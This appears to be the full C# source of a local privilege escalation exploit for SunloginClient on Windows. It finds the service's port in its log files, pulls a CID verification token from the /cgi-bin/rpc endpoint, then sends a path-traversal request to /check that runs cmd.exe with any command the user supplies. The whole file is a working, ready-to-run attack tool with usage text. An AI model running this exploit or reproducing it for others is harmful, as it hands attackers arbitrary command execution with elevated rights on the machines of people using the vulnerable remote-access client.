using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Net;

namespace sunloginLPE
{

    internal class Program
    {
        static string GetLatestFiles(string Path, int count)
        {
            var query = (from f in Directory.GetFiles(Path)
                         let fi = new FileInfo(f)
                         orderby fi.CreationTime descending
                         select fi.FullName).Take(count);
            string[] files = query.ToArray();
            for (int i = 0; i < files.Length; i++)
            {
                if (files[i].Contains("sunlogin_service."))
                {
                    return files[i];
                }
            }
            Console.WriteLine("[-] logFile not found");
            return "";
        }
        static string getPort(string path)
        {
            string logFile = GetLatestFiles(path + "\\log", 2);
            string port = "";
            string s;
            if (logFile != "")
            {
                FileStream fs = new FileStream(logFile, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                StreamReader sr = new StreamReader(fs, System.Text.Encoding.Default);
                s  = sr.ReadToEnd();
                string pattern = @"\bstart listen OK\S*\,";
                string pattern2 = @"\d{5}";
                string res = "";
                MatchCollection mc = Regex.Matches(s, pattern);
                foreach (Match m in mc)
                    res = m.Value;
                MatchCollection mc2 = Regex.Matches(res, pattern2);
                foreach (Match m2 in mc2)
                    port = m2.Value;
            }
            return port;

        }

        private static String HttpGet(string url, string requestData)
        {
            // 实例化请求对象
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + "?" + requestData);
            request.Method = "GET";
            request.ContentType = "text/html; charset=UTF-8";

            // 实例化响应对象，获取响应信息
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream responseStream = response.GetResponseStream();
            StreamReader sReader = new StreamReader(responseStream, Encoding.Default);
            String result = sReader.ReadToEnd();
            sReader.Close();
            responseStream.Close();
            return result;
        }

        private static String HttpGetWithCookie(string url, string requestData,string cookie)
        {
            // 实例化请求对象
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + "?" + requestData);
            request.Method = "GET";
            request.ContentType = "text/html; charset=UTF-8";
            request.Headers.Add("Cookie", "CID=" + cookie);

            // 实例化响应对象，获取响应信息
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream responseStream = response.GetResponseStream();
            StreamReader sReader = new StreamReader(responseStream, Encoding.Default);
            String result = sReader.ReadToEnd();
            sReader.Close();
            responseStream.Close();
            return result;
        }
        static string exp(string SunloginClient_port,string ExecCmd)
        {
            String targetUrl = "http://127.0.0.1:" + SunloginClient_port + "/cgi-bin/rpc";
            String response = HttpGet(targetUrl, "action=verify-haras");
            string pattern = "verify_string\":\"(\\w+)?\"";
            string cid = "";
            MatchCollection mc = Regex.Matches(response, pattern);
            foreach (Match m in mc)
                cid = m.Value;
            cid = cid.Replace("\"", "").Replace("verify_string:", "");
            Console.WriteLine("[+] CID=" +cid);

            targetUrl = "http://127.0.0.1:" + SunloginClient_port + "/check";
            response = HttpGetWithCookie(targetUrl, "cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows\\system32\\cmd.exe+/c+" + ExecCmd.Replace(" ","+"),cid);

            return response;
        }
        static void Main(string[] args)
        {
            
            Console.WriteLine("[!] Usage: sunloginLPE.exe Cmd [sunloginClientPath]（DefaultPath = C:\\Program Files\\Oray\\SunLogin\\SunloginClient）");
            string defaultPath = "C:\\Program Files\\Oray\\SunLogin\\SunloginClient";
            string cmd = "";
            string path = defaultPath;
            string port = "";
            if(args.Length  == 1)
            {
                cmd = args[0];
            }
            else if(args.Length == 2)
            {
                cmd=args[0];
                path =args[1];
            }
            else
            {
                Console.WriteLine("[-] wrong number of parameters");
                System.Environment.Exit(0);
            }
            try
            {
                port = getPort(path);
                if(port != "")
                {
                    Console.WriteLine("[+] SunloginClient port is " + port);
                }
                else
                {
                    Console.WriteLine("[-] SunloginClient port not found");
                    System.Environment.Exit(0);
                }
                Console.WriteLine("[+] 命令执行结果: \n" + exp(port, cmd));
            }
            catch(Exception ex)
            {
                Console.WriteLine("[-] " + ex.ToString());
            }
        }
    }
}
